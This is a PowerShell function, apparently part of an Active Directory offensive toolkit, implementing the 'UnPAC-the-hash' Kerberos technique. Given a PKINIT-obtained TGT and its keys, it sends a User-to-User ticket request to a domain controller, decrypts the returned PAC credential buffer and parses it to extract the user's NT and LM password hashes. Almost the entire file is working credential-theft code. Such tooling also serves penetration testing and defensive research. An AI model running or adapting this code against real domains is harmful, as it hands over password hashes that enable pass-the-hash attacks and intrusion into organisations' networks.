<#
.SYNOPSIS
    Recovers the NT hash from a PKINIT-authenticated TGT via User-to-User (U2U) Kerberos.

.DESCRIPTION
    Implements the "UnPAC-the-hash" technique to extract the user's NT hash from
    the PAC_CREDENTIAL_INFO buffer (Type 2) in a U2U service ticket.

    Protocol flow:
    1. Send U2U TGS-REQ to self (enc-tkt-in-skey, TGT as additional-ticket)
    2. KDC returns service ticket with PAC_CREDENTIAL_INFO containing encrypted credentials
    3. Decrypt service ticket enc-part with TGT session key (KeyUsage=2)
    4. Parse EncTicketPart to extract PAC
    5. Decrypt PAC_CREDENTIAL_INFO with AS-REP Reply Key (KeyUsage=16)
    6. Parse NDR-serialized NTLM_SUPPLEMENTAL_CREDENTIAL to extract NT hash

    This technique only works with PKINIT authentication because the KDC includes
    the PAC_CREDENTIAL_INFO buffer only when Diffie-Hellman key exchange was used
    (the KDC cannot encrypt credentials with a key the client already knows).

.PARAMETER TGT
    The TGT ticket bytes (raw APPLICATION 1 Ticket from PKINIT AS-REP).

.PARAMETER SessionKey
    The TGT session key bytes (from EncASRepPart).

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER ASRepReplyKey
    The DH-derived AS-REP Reply Key (from PKINIT key exchange).
    Used to decrypt PAC_CREDENTIAL_INFO (KeyUsage=16).

.PARAMETER UserName
    The authenticated user's sAMAccountName.

.PARAMETER Domain
    The target domain (realm).

.PARAMETER DomainController
    The KDC server to send the U2U TGS-REQ to.

.OUTPUTS
    PSCustomObject with Success, NTHash, LMHash, UserName, Domain properties.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - MS-PAC Section 2.6: PAC_CREDENTIAL_INFO
    - MS-PAC Section 2.6.1: PAC_CREDENTIAL_DATA (NDR)
    - MS-PAC Section 2.6.3: NTLM_SUPPLEMENTAL_CREDENTIAL
    - RFC 4120 Section 3.3.1: User-to-User Authentication
    - Rubeus (GhostPack): UnPAC-the-hash implementation
    - Certipy: auth.py UnPAC-the-hash implementation
#>

function Invoke-UnPACTheHash {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$TGT,

        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [byte[]]$ASRepReplyKey,

        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainController
    )

    process {
        try {
            Write-Log "[Invoke-UnPACTheHash] Starting UnPAC-the-hash for $UserName@$Domain"

            # Step 1: U2U TGS-REQ to self
            # The enc-tkt-in-skey option tells the KDC to encrypt the service ticket
            # with the session key from the additional-ticket (our TGT)
            Write-Log "[Invoke-UnPACTheHash] Sending U2U TGS-REQ to $DomainController"

            $u2uResult = Request-ServiceTicket `
                -TGT $TGT `
                -SessionKey $SessionKey `
                -SessionKeyType $SessionKeyType `
                -ServicePrincipalName $UserName `
                -Domain $Domain `
                -DomainController $DomainController `
                -UserName $UserName `
                -U2U

            if (-not $u2uResult.Success) {
                throw "U2U TGS-REQ failed: $($u2uResult.Error)"
            }

            Write-Log "[Invoke-UnPACTheHash] U2U TGS-REP received, ticket etype: $($u2uResult.EncryptionType)"

            # Step 2: Parse the service ticket to get the encrypted part
            # TicketBytes contains the full APPLICATION 1 Ticket
            $ticketInfo = Read-KerberosTicket -TicketBytes $u2uResult.TicketBytes

            if (-not $ticketInfo.EncPart) {
                throw "Failed to extract enc-part from U2U service ticket"
            }

            Write-Log "[Invoke-UnPACTheHash] Service ticket enc-part: $($ticketInfo.EncPart.Length) bytes, etype: $($ticketInfo.EType)"

            # Step 3: Decrypt the service ticket enc-part with TGT session key (KeyUsage=2)
            # In U2U, the service ticket is encrypted with the TGT session key (from additional-ticket)
            $decryptedTicket = Unprotect-KerberosNative `
                -Key $SessionKey `
                -CipherText $ticketInfo.EncPart `
                -KeyUsage 2 `
                -EncryptionType $SessionKeyType

            if (-not $decryptedTicket -or $decryptedTicket.Length -eq 0) {
                throw "Failed to decrypt U2U service ticket enc-part"
            }

            Write-Log "[Invoke-UnPACTheHash] Decrypted EncTicketPart: $($decryptedTicket.Length) bytes"

            # Step 4: Parse EncTicketPart to extract PAC
            $encTicketPart = Read-EncTicketPart -EncTicketPartBytes $decryptedTicket

            if (-not $encTicketPart.PAC) {
                throw "No PAC found in U2U service ticket"
            }

            Write-Log "[Invoke-UnPACTheHash] PAC extracted: $($encTicketPart.PAC.Length) bytes"

            # Step 5: Parse PAC to find PAC_CREDENTIAL_INFO (Buffer Type 2)
            $pacResult = Read-PAC -PACData $encTicketPart.PAC

            if (-not $pacResult -or -not $pacResult.CredentialInfoBuffer) {
                throw "No PAC_CREDENTIAL_INFO (Type 2) buffer found in PAC. The KDC may not include credentials for this authentication type."
            }

            $credInfoBuffer = $pacResult.CredentialInfoBuffer
            Write-Log "[Invoke-UnPACTheHash] PAC_CREDENTIAL_INFO found: $($credInfoBuffer.Length) bytes"

            # Step 6: Parse PAC_CREDENTIAL_INFO header
            # Structure: Version(4 bytes, UInt32) + EncryptionType(4 bytes, UInt32) + SerializedData(rest)
            if ($credInfoBuffer.Length -lt 12) {
                throw "PAC_CREDENTIAL_INFO too short: $($credInfoBuffer.Length) bytes (minimum 12)"
            }

            $credVersion = [BitConverter]::ToUInt32($credInfoBuffer, 0)
            $credEncType = [BitConverter]::ToUInt32($credInfoBuffer, 4)
            $serializedData = $credInfoBuffer[8..($credInfoBuffer.Length - 1)]

            Write-Log "[Invoke-UnPACTheHash] PAC_CREDENTIAL_INFO: version=$credVersion, etype=$credEncType, data=$($serializedData.Length) bytes"

            if ($credVersion -ne 0) {
                Write-Warning "[!] Unexpected PAC_CREDENTIAL_INFO version: $credVersion (expected 0)"
            }

            # Step 7: Decrypt PAC_CREDENTIAL_INFO with AS-REP Reply Key (KeyUsage=16)
            # This is the DH-derived key from PKINIT, NOT the TGT session key
            $decryptedCreds = Unprotect-KerberosNative `
                -Key $ASRepReplyKey `
                -CipherText $serializedData `
                -KeyUsage 16 `
                -EncryptionType $credEncType

            if (-not $decryptedCreds -or $decryptedCreds.Length -eq 0) {
                throw "Failed to decrypt PAC_CREDENTIAL_INFO"
            }

            Write-Log "[Invoke-UnPACTheHash] Decrypted credential data: $($decryptedCreds.Length) bytes"

            # Step 8: Parse NDR-serialized PAC_CREDENTIAL_DATA
            # NDR Type Serialization 1 header: 16 bytes (8 common + 8 private)
            # Then optional top-level referent pointer (4 bytes)
            # Common header starts with 0x01 0x10
            $ntHash = $null
            $lmHash = $null
            $offset = 0

            # Skip NDR Type Serialization 1 header
            if ($decryptedCreds.Length -lt 24) {
                throw "Decrypted credential data too short for NDR header: $($decryptedCreds.Length) bytes"
            }

            # Verify common header signature
            if ($decryptedCreds[0] -eq 0x01 -and $decryptedCreds[1] -eq 0x10) {
                $offset = 16  # Skip 16-byte NDR header (8 common + 8 private)
                Write-Log "[Invoke-UnPACTheHash] NDR Type Serialization 1 header detected"
            } else {
                Write-Log "[Invoke-UnPACTheHash] No NDR Type Serialization header, parsing from start" -Level Warning
            }

            # Skip top-level referent pointer (4 bytes) if present
            # The referent pointer is a non-null pointer to the PAC_CREDENTIAL_DATA structure
            if ($offset + 4 -le $decryptedCreds.Length) {
                $topLevelPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                if ($topLevelPtr -ne 0) {
                    $offset += 4
                    Write-Log "[Invoke-UnPACTheHash] Top-level referent pointer: 0x$($topLevelPtr.ToString('X8'))"
                }
            }

            # PAC_CREDENTIAL_DATA: CredentialCount (4 bytes UInt32)
            if ($offset + 4 -gt $decryptedCreds.Length) {
                throw "Not enough data for CredentialCount at offset $offset"
            }

            $credentialCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
            $offset += 4
            Write-Log "[Invoke-UnPACTheHash] CredentialCount: $credentialCount"

            if ($credentialCount -eq 0) {
                throw "No credentials found in PAC_CREDENTIAL_DATA"
            }

            # Skip conformant array MaxCount (4 bytes) - NDR conformant arrays
            # have a MaxCount prefix before the actual array elements
            if ($offset + 4 -gt $decryptedCreds.Length) {
                throw "Not enough data for conformant array MaxCount at offset $offset"
            }
            $arrayMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
            $offset += 4
            Write-Log "[Invoke-UnPACTheHash] Conformant array MaxCount: $arrayMaxCount"

            # Parse SECPKG_SUPPLEMENTAL_CRED entries (NDR encoded)
            # Each entry has: PackageName (RPC_UNICODE_STRING), CredentialSize (UInt32), Credentials (pointer)
            # NDR RPC_UNICODE_STRING: Length(2) + MaxLength(2) + Pointer(4)
            # We need to read all fixed-size parts first, then referents

            # Fixed part of each SECPKG_SUPPLEMENTAL_CRED:
            # - PackageName.Length (2 bytes)
            # - PackageName.MaximumLength (2 bytes)
            # - PackageName.Buffer pointer (4 bytes)
            # - CredentialSize (4 bytes)
            # - Credentials pointer (4 bytes)
            # Total: 16 bytes per entry

            $entries = @()
            for ($i = 0; $i -lt $credentialCount; $i++) {
                if ($offset + 16 -gt $decryptedCreds.Length) {
                    Write-Log "[Invoke-UnPACTheHash] Not enough data for entry $i at offset $offset" -Level Warning
                    break
                }

                $pkgNameLength = [BitConverter]::ToUInt16($decryptedCreds, $offset)
                $pkgNameMaxLen = [BitConverter]::ToUInt16($decryptedCreds, $offset + 2)
                $pkgNamePtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
                $credSize = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
                $credPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 12)
                $offset += 16

                $entries += @{
                    PackageNameLength = $pkgNameLength
                    PackageNameMaxLength = $pkgNameMaxLen
                    PackageNamePtr = $pkgNamePtr
                    CredentialSize = $credSize
                    CredentialPtr = $credPtr
                }

                Write-Log "[Invoke-UnPACTheHash] Entry ${i}: nameLen=$pkgNameLength, credSize=$credSize, namePtr=0x$($pkgNamePtr.ToString('X8')), credPtr=0x$($credPtr.ToString('X8'))"
            }

            # Now parse referents in declaration order
            # For each entry: PackageName referent (if pointer != 0), then Credentials referent (if pointer != 0)
            foreach ($entry in $entries) {
                $packageName = $null

                # PackageName referent (RPC_UNICODE_STRING)
                if ($entry.PackageNamePtr -ne 0) {
                    if ($offset + 12 -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for PackageName referent at offset $offset" -Level Warning
                        break
                    }

                    # MaxCount(4) + Offset(4) + ActualCount(4) + UTF-16LE data
                    $maxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                    $ndrOffset = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
                    $actualCount = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
                    $offset += 12

                    $stringByteLen = $actualCount * 2  # UTF-16LE
                    if ($offset + $stringByteLen -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for PackageName string at offset $offset" -Level Warning
                        break
                    }

                    $packageName = [System.Text.Encoding]::Unicode.GetString($decryptedCreds, $offset, $stringByteLen)
                    $offset += $stringByteLen

                    # Align to 4-byte boundary
                    $padding = (4 - ($offset % 4)) % 4
                    $offset += $padding

                    Write-Log "[Invoke-UnPACTheHash] Package: '$packageName'"
                }

                # Credentials referent
                if ($entry.CredentialPtr -ne 0 -and $entry.CredentialSize -gt 0) {
                    # Conformant byte array: MaxCount(4) + data
                    if ($offset + 4 -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for Credentials MaxCount at offset $offset" -Level Warning
                        break
                    }

                    $credMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
                    $offset += 4

                    $credDataLen = [Math]::Min($credMaxCount, $entry.CredentialSize)
                    if ($offset + $credDataLen -gt $decryptedCreds.Length) {
                        Write-Log "[Invoke-UnPACTheHash] Not enough data for Credentials at offset $offset (need $credDataLen)" -Level Warning
                        break
                    }

                    $credData = $decryptedCreds[$offset..($offset + $credDataLen - 1)]
                    $offset += $credDataLen

                    # Align to 4-byte boundary
                    $padding = (4 - ($offset % 4)) % 4
                    $offset += $padding

                    # Check if this is the NTLM package
                    if ($packageName -eq "NTLM") {
                        # NTLM_SUPPLEMENTAL_CREDENTIAL:
                        # Version (4 bytes, UInt32) = 0
                        # Flags (4 bytes, UInt32) - bit 1 = LM present, bit 2 = NT present
                        # LmPassword (16 bytes)
                        # NtPassword (16 bytes)
                        if ($credData.Length -ge 40) {
                            $ntlmVersion = [BitConverter]::ToUInt32($credData, 0)
                            $ntlmFlags = [BitConverter]::ToUInt32($credData, 4)
                            $lmBytes = $credData[8..23]
                            $ntBytes = $credData[24..39]

                            Write-Log "[Invoke-UnPACTheHash] NTLM_SUPPLEMENTAL_CREDENTIAL: version=$ntlmVersion, flags=$ntlmFlags"

                            # Flags: 1 = LM_OWF_PASSWORD, 2 = NT_OWF_PASSWORD
                            if ($ntlmFlags -band 2) {
                                $ntHash = ($ntBytes | ForEach-Object { $_.ToString("x2") }) -join ''
                                Write-Log "[Invoke-UnPACTheHash] NT hash recovered: $ntHash"
                            }

                            if ($ntlmFlags -band 1) {
                                $lmHash = ($lmBytes | ForEach-Object { $_.ToString("x2") }) -join ''
                                Write-Log "[Invoke-UnPACTheHash] LM hash recovered: $lmHash"
                            }
                        } else {
                            Write-Log "[Invoke-UnPACTheHash] NTLM credential data too short: $($credData.Length) bytes (expected >= 40)" -Level Warning
                        }
                    } else {
                        Write-Log "[Invoke-UnPACTheHash] Skipping non-NTLM package: '$packageName'"
                    }
                }
            }

            if (-not $ntHash) {
                throw "NT hash not found in PAC_CREDENTIAL_DATA"
            }

            Write-Log "[Invoke-UnPACTheHash] UnPAC-the-hash successful for $UserName@$Domain"

            return [PSCustomObject]@{
                Success  = $true
                NTHash   = $ntHash
                LMHash   = $lmHash
                UserName = $UserName
                Domain   = $Domain
                Message  = "NT hash recovered via UnPAC-the-hash"
            }
        }
        catch {
            Write-Log "[Invoke-UnPACTheHash] Failed: $_" -Level Warning
            return [PSCustomObject]@{
                Success  = $false
                NTHash   = $null
                LMHash   = $null
                UserName = $UserName
                Domain   = $Domain
                Message  = "UnPAC-the-hash failed: $_"
            }
        }
    }
}
